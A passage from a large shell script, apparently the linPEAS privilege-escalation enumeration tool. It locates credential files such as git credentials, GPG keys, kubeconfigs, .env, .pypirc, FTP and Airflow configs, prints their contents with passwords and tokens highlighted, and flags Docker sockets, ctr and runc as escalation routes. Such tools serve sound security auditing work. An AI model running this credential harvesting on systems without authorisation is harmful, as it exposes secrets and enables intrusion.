  4141	    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.git-credentials$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git-credentials"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.git-credentials$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git-credentials$,${SED_RED},"; done; echo "";
  4142	    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.git$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.git$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git$,${SED_RED},"; done; echo "";
  4143	fi
  4144	
  4145	
  4146	if [ "$PSTORAGE_SVN" ] || [ "$DEBUG" ]; then
  4147	  print_2title "Analyzing Svn Files (limit 70)"
  4148	    if ! [ "`echo \"$PSTORAGE_SVN\" | grep -E \"\.svn$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".svn"; fi; fi; printf "%s" "$PSTORAGE_SVN" | grep -E "\.svn$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.svn$,${SED_RED},"; ls -lRA "$f";done; echo "";
  4149	fi
  4150	
  4151	
  4152	if [ "$PSTORAGE_PGP_GPG" ] || [ "$DEBUG" ]; then
  4153	  print_2title "Analyzing PGP-GPG Files (limit 70)"
  4154	    ( (command -v gpg && gpg --list-keys) || echo_not_found "gpg") 2>/dev/null
  4155	    ( (command -v netpgpkeys && netpgpkeys --list-keys) || echo_not_found "netpgpkeys") 2>/dev/null
  4156	    (command -v netpgp || echo_not_found "netpgp") 2>/dev/null
  4157	    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.pgp$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.pgp"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.pgp$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.pgp$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4158	    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.gpg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.gpg"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.gpg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gpg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4159	    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.gnupg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.gnupg"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.gnupg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gnupg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4160	fi
  4161	
  4162	
  4163	if [ "$PSTORAGE_CACHE_VI" ] || [ "$DEBUG" ]; then
  4164	  print_2title "Analyzing Cache Vi Files (limit 70)"
  4165	    if ! [ "`echo \"$PSTORAGE_CACHE_VI\" | grep -E \"\.swp$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.swp"; fi; fi; printf "%s" "$PSTORAGE_CACHE_VI" | grep -E "\.swp$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.swp$,${SED_RED},"; done; echo "";
  4166	    if ! [ "`echo \"$PSTORAGE_CACHE_VI\" | grep -E \"\.viminfo$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.viminfo"; fi; fi; printf "%s" "$PSTORAGE_CACHE_VI" | grep -E "\.viminfo$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.viminfo$,${SED_RED},"; done; echo "";
  4167	fi
  4168	
  4169	
  4170	if [ "$PSTORAGE_WGET" ] || [ "$DEBUG" ]; then
  4171	  print_2title "Analyzing Wget Files (limit 70)"
  4172	    if ! [ "`echo \"$PSTORAGE_WGET\" | grep -E \"\.wgetrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".wgetrc"; fi; fi; printf "%s" "$PSTORAGE_WGET" | grep -E "\.wgetrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.wgetrc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
  4173	fi
  4174	
  4175	
  4176	##-- SI) containerd installed
  4177	if ! [ "$SEARCH_IN_FOLDER" ]; then
  4178	  containerd=$(command -v ctr)
  4179	  if [ "$containerd" ] || [ "$DEBUG" ]; then
  4180	    print_2title "Checking if containerd(ctr) is available"
  4181	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation"
  4182	    if [ "$containerd" ]; then
  4183	      echo "ctr was found in $containerd, you may be able to escalate privileges with it" | sed -${E} "s,.*,${SED_RED},"
  4184	      ctr image list 2>&1
  4185	    fi
  4186	    echo ""
  4187	  fi
  4188	fi
  4189	
  4190	##-- SI) runc installed
  4191	if ! [ "$SEARCH_IN_FOLDER" ]; then
  4192	  runc=$(command -v runc)
  4193	  if [ "$runc" ] || [ "$DEBUG" ]; then
  4194	    print_2title "Checking if runc is available"
  4195	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation"
  4196	    if [ "$runc" ]; then
  4197	      echo "runc was found in $runc, you may be able to escalate privileges with it" | sed -${E} "s,.*,${SED_RED},"
  4198	    fi
  4199	    echo ""
  4200	  fi
  4201	fi
  4202	
  4203	#-- SI) Docker
  4204	if [ "$PSTORAGE_DOCKER" ] || [ "$DEBUG" ]; then
  4205	  print_2title "Searching docker files (limit 70)"
  4206	  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation"
  4207	  printf "%s\n" "$PSTORAGE_DOCKER" | head -n 70 | while read f; do
  4208	    ls -l "$f" 2>/dev/null
  4209	    if ! [ "$IAMROOT" ] && [ -S "$f" ] && [ -w "$f" ]; then
  4210	      echo "Docker related socket ($f) is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  4211	    fi
  4212	  done
  4213	  echo ""
  4214	fi
  4215	
  4216	if [ "$PSTORAGE_KUBERNETES" ] || [ "$DEBUG" ]; then
  4217	  print_2title "Analyzing Kubernetes Files (limit 70)"
  4218	    (env || set) | grep -Ei "kubernetes|kube" | grep -v "PSTORAGE_KUBERNETES|USEFUL_SOFTWARE" | sed -${E} "s,kubernetes|kube,${SED_RED},"
  4219	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
  4220	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"bootstrap-kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bootstrap-kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "bootstrap-kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bootstrap-kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
  4221	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet-kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet-kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet-kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet-kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
  4222	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet.conf"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
  4223	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"psk\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "psk.txt"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "psk\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,psk\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4224	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"\.kube.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".kube*"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "\.kube.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.kube.*$,${SED_RED},"; find "$f" -name "config" | while read ff; do ls -ld "$ff" | sed -${E} "s,config,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";done; echo "";
  4225	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet$,${SED_RED},"; find "$f" -name "config.yaml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yaml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "kubeadm-flags.env" | while read ff; do ls -ld "$ff" | sed -${E} "s,kubeadm-flags.env,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$"; done; echo "";done; echo "";
  4226	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kube-proxy$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kube-proxy"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kube-proxy$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kube-proxy$,${SED_RED},"; done; echo "";
  4227	    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubernetes$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubernetes"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubernetes$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubernetes$,${SED_RED},"; find "$f" -name "admin.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,admin.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "controller-manager.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,controller-manager.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "scheduler.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,scheduler.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";done; echo "";
  4228	fi
  4229	
  4230	
  4231	if [ "$PSTORAGE_FIREFOX" ] || [ "$DEBUG" ]; then
  4232	  print_2title "Analyzing Firefox Files (limit 70)"
  4233	    if ! [ "`echo \"$PSTORAGE_FIREFOX\" | grep -E \"\.mozilla$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".mozilla"; fi; fi; printf "%s" "$PSTORAGE_FIREFOX" | grep -E "\.mozilla$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.mozilla$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4234	    if ! [ "`echo \"$PSTORAGE_FIREFOX\" | grep -E \"Firefox$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Firefox"; fi; fi; printf "%s" "$PSTORAGE_FIREFOX" | grep -E "Firefox$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Firefox$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4235	fi
  4236	
  4237	
  4238	if [ "$PSTORAGE_CHROME" ] || [ "$DEBUG" ]; then
  4239	  print_2title "Analyzing Chrome Files (limit 70)"
  4240	    if ! [ "`echo \"$PSTORAGE_CHROME\" | grep -E \"google-chrome$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "google-chrome"; fi; fi; printf "%s" "$PSTORAGE_CHROME" | grep -E "google-chrome$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,google-chrome$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4241	    if ! [ "`echo \"$PSTORAGE_CHROME\" | grep -E \"Chrome$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Chrome"; fi; fi; printf "%s" "$PSTORAGE_CHROME" | grep -E "Chrome$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Chrome$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
  4242	fi
  4243	
  4244	
  4245	if [ "$PSTORAGE_AUTOLOGIN" ] || [ "$DEBUG" ]; then
  4246	  print_2title "Analyzing Autologin Files (limit 70)"
  4247	    if ! [ "`echo \"$PSTORAGE_AUTOLOGIN\" | grep -E \"autologin$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autologin"; fi; fi; printf "%s" "$PSTORAGE_AUTOLOGIN" | grep -E "autologin$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autologin$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,passwd,${SED_RED},g"; done; echo "";
  4248	    if ! [ "`echo \"$PSTORAGE_AUTOLOGIN\" | grep -E \"autologin\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "autologin.conf"; fi; fi; printf "%s" "$PSTORAGE_AUTOLOGIN" | grep -E "autologin\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,autologin\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,passwd,${SED_RED},g"; done; echo "";
  4249	fi
  4250	
  4251	
  4252	#-- SI) S/Key athentication
  4253	if (grep auth= /etc/login.conf 2>/dev/null | grep -v "^#" | grep -q skey) || [ "$DEBUG" ] ; then
  4254	  print_2title "S/Key authentication"
  4255	  printf "System supports$RED S/Key$NC authentication\n"
  4256	  if ! [ -d /etc/skey/ ]; then
  4257	    echo "${GREEN}S/Key authentication enabled, but has not been initialized"
  4258	  elif ! [ "$IAMROOT" ] && [ -w /etc/skey/ ]; then
  4259	    echo "${RED}/etc/skey/ is writable by you"
  4260	    ls -ld /etc/skey/
  4261	  else
  4262	    ls -ld /etc/skey/ 2>/dev/null
  4263	  fi
  4264	fi
  4265	echo ""
  4266	
  4267	#-- SI) YubiKey athentication
  4268	if (grep "auth=" /etc/login.conf 2>/dev/null | grep -v "^#" | grep -q yubikey) || [ "$DEBUG" ]; then
  4269	  print_2title "YubiKey authentication"
  4270	  printf "System supports$RED YubiKey$NC authentication\n"
  4271	  if ! [ "$IAMROOT" ] && [ -w /var/db/yubikey/ ]; then
  4272	    echo "${RED}/var/db/yubikey/ is writable by you"
  4273	    ls -ld /var/db/yubikey/
  4274	  else
  4275	    ls -ld /var/db/yubikey/ 2>/dev/null
  4276	  fi
  4277	  echo ""
  4278	fi
  4279	
  4280	if [ "$PSTORAGE_SNMP" ] || [ "$DEBUG" ]; then
  4281	  print_2title "Analyzing SNMP Files (limit 70)"
  4282	    if ! [ "`echo \"$PSTORAGE_SNMP\" | grep -E \"snmpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "snmpd.conf"; fi; fi; printf "%s" "$PSTORAGE_SNMP" | grep -E "snmpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,snmpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "rocommunity|rwcommunity|extend.*|^createUser" | sed -${E} "s,rocommunity|rwcommunity|extend.*|^createUser,${SED_RED},g"; done; echo "";
  4283	fi
  4284	
  4285	
  4286	if [ "$PSTORAGE_PYPIRC" ] || [ "$DEBUG" ]; then
  4287	  print_2title "Analyzing Pypirc Files (limit 70)"
  4288	    if ! [ "`echo \"$PSTORAGE_PYPIRC\" | grep -E \"\.pypirc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".pypirc"; fi; fi; printf "%s" "$PSTORAGE_PYPIRC" | grep -E "\.pypirc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.pypirc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username|password,${SED_RED},g"; done; echo "";
  4289	fi
  4290	
  4291	
  4292	if [ "$PSTORAGE_POSTFIX" ] || [ "$DEBUG" ]; then
  4293	  print_2title "Analyzing Postfix Files (limit 70)"
  4294	    if ! [ "`echo \"$PSTORAGE_POSTFIX\" | grep -E \"postfix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "postfix"; fi; fi; printf "%s" "$PSTORAGE_POSTFIX" | grep -E "postfix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,postfix$,${SED_RED},"; find "$f" -name "master.cf" | while read ff; do ls -ld "$ff" | sed -${E} "s,master.cf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "user=" | sed -${E} "s,user=|argv=,${SED_RED},g"; done; echo "";done; echo "";
  4295	fi
  4296	
  4297	
  4298	if [ "$PSTORAGE_LDAPRC" ] || [ "$DEBUG" ]; then
  4299	  print_2title "Analyzing Ldaprc Files (limit 70)"
  4300	    if ! [ "`echo \"$PSTORAGE_LDAPRC\" | grep -E \"\.ldaprc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".ldaprc"; fi; fi; printf "%s" "$PSTORAGE_LDAPRC" | grep -E "\.ldaprc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ldaprc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
  4301	fi
  4302	
  4303	
  4304	if [ "$PSTORAGE_ENV" ] || [ "$DEBUG" ]; then
  4305	  print_2title "Analyzing Env Files (limit 70)"
  4306	    if ! [ "`echo \"$PSTORAGE_ENV\" | grep -E \"\.env.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".env*"; fi; fi; printf "%s" "$PSTORAGE_ENV" | grep -E "\.env.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.env.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[tT][oO][kK][eE][N]|[dD][bB]|[pP][rR][iI][vV][aA][tT][eE]|[kK][eE][yY],${SED_RED},g"; done; echo "";
  4307	fi
  4308	
  4309	
  4310	if [ "$PSTORAGE_MSMTPRC" ] || [ "$DEBUG" ]; then
  4311	  print_2title "Analyzing Msmtprc Files (limit 70)"
  4312	    if ! [ "`echo \"$PSTORAGE_MSMTPRC\" | grep -E \"\.msmtprc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".msmtprc"; fi; fi; printf "%s" "$PSTORAGE_MSMTPRC" | grep -E "\.msmtprc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.msmtprc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user.*|password.*,${SED_RED},g"; done; echo "";
  4313	fi
  4314	
  4315	
  4316	if [ "$PSTORAGE_KEEPASS" ] || [ "$DEBUG" ]; then
  4317	  print_2title "Analyzing Keepass Files (limit 70)"
  4318	    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"\.kdbx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.kdbx"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "\.kdbx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.kdbx$,${SED_RED},"; done; echo "";
  4319	    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.config.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.config*"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.config.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.config.*$,${SED_RED},"; done; echo "";
  4320	    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.ini"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.ini$,${SED_RED},"; done; echo "";
  4321	    if ! [ "`echo \"$PSTORAGE_KEEPASS\" | grep -E \"KeePass\.enforced.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "KeePass.enforced*"; fi; fi; printf "%s" "$PSTORAGE_KEEPASS" | grep -E "KeePass\.enforced.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,KeePass\.enforced.*$,${SED_RED},"; done; echo "";
  4322	fi
  4323	
  4324	
  4325	if [ "$PSTORAGE_FTP" ] || [ "$DEBUG" ]; then
  4326	  print_2title "Analyzing FTP Files (limit 70)"
  4327	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"vsftpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "vsftpd.conf"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "vsftpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vsftpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "anonymous_enable|anon_upload_enable|anon_mkdir_write_enable|anon_root|chown_uploads|chown_username|local_enable|no_anon_password|write_enable" | sed -${E} "s,anonymous_enable|anon_upload_enable|anon_mkdir_write_enable|anon_root|chown_uploads|chown_username|local_enable|no_anon_password|write_enable|[yY][eE][sS],${SED_RED},g" | sed -${E} "s,\s[nN][oO]|=[nN][oO],${SED_GOOD},g"; done; echo "";
  4328	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"\.ftpconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.ftpconfig"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "\.ftpconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ftpconfig$,${SED_RED},"; done; echo "";
  4329	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ffftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ffftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ffftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ffftp\.ini$,${SED_RED},"; done; echo "";
  4330	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ftp\.ini$,${SED_RED},"; done; echo "";
  4331	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ftp\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ftp.config"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ftp\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ftp\.config$,${SED_RED},"; done; echo "";
  4332	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"sites\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "sites\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites\.ini$,${SED_RED},"; done; echo "";
  4333	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"wcx_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wcx_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "wcx_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wcx_ftp\.ini$,${SED_RED},"; done; echo "";
  4334	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"winscp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "winscp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "winscp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,winscp\.ini$,${SED_RED},"; done; echo "";
  4335	    if ! [ "`echo \"$PSTORAGE_FTP\" | grep -E \"ws_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ws_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_FTP" | grep -E "ws_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ws_ftp\.ini$,${SED_RED},"; done; echo "";
  4336	fi
  4337	
  4338	
  4339	if [ "$PSTORAGE_VARNISH" ] || [ "$DEBUG" ]; then
  4340	  print_2title "Analyzing Varnish Files (limit 70)"
  4341	    if ! [ "`echo \"$PSTORAGE_VARNISH\" | grep -E \"varnish$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "varnish"; fi; fi; printf "%s" "$PSTORAGE_VARNISH" | grep -E "varnish$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,varnish$,${SED_RED},"; find "$f" -name "default.vcl" | while read ff; do ls -ld "$ff" | sed -${E} "s,default.vcl,${SED_RED},"; done; echo "";find "$f" -name "secret" | while read ff; do ls -ld "$ff" | sed -${E} "s,secret,${SED_RED},"; done; echo "";done; echo "";
  4342	fi
  4343	
  4344	
  4345	if [ "$PSTORAGE_APACHE_AIRFLOW" ] || [ "$DEBUG" ]; then
  4346	  print_2title "Analyzing Apache-Airflow Files (limit 70)"
  4347	    if ! [ "`echo \"$PSTORAGE_APACHE_AIRFLOW\" | grep -E \"airflow\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "airflow.cfg"; fi; fi; printf "%s" "$PSTORAGE_APACHE_AIRFLOW" | grep -E "airflow\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,airflow\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,access_control_allow_headers|access_control_allow_methods|access_control_allow_origins|auth_backend|backend.default|google_key_path.*|password|username|flower_basic_auth.*|result_backend.*|ssl_cacert|ssl_cert|ssl_key|fernet_key.*|tls_ca|tls_cert|tls_key|ccache|google_key_path|smtp_password.*|smtp_user.*|cookie_samesite|cookie_secure|expose_config|expose_stacktrace|secret_key|x_frame_enabled,${SED_RED},g"; done; echo "";
  4348	    if ! [ "`echo \"$PSTORAGE_APACHE_AIRFLOW\" | grep -E \"webserver_config\.py$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "webserver_config.py"; fi; fi; printf "%s" "$PSTORAGE_APACHE_AIRFLOW" | grep -E "webserver_config\.py$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,webserver_config\.py$,${SED_RED},"; done; echo "";
  4349	fi
  4350	
  4351	
  4352	if [ "$PSTORAGE_X11" ] || [ "$DEBUG" ]; then
  4353	  print_2title "Analyzing X11 Files (limit 70)"
  4354	    if ! [ "`echo \"$PSTORAGE_X11\" | grep -E \"\.Xauthority$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".Xauthority"; fi; fi; printf "%s" "$PSTORAGE_X11" | grep -E "\.Xauthority$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.Xauthority$,${SED_RED},"; done; echo "";
  4355	fi
  4356	
  4357	
  4358	if [ "$PSTORAGE_ROCKETCHAT" ] || [ "$DEBUG" ]; then
  4359	  print_2title "Analyzing Rocketchat Files (limit 70)"
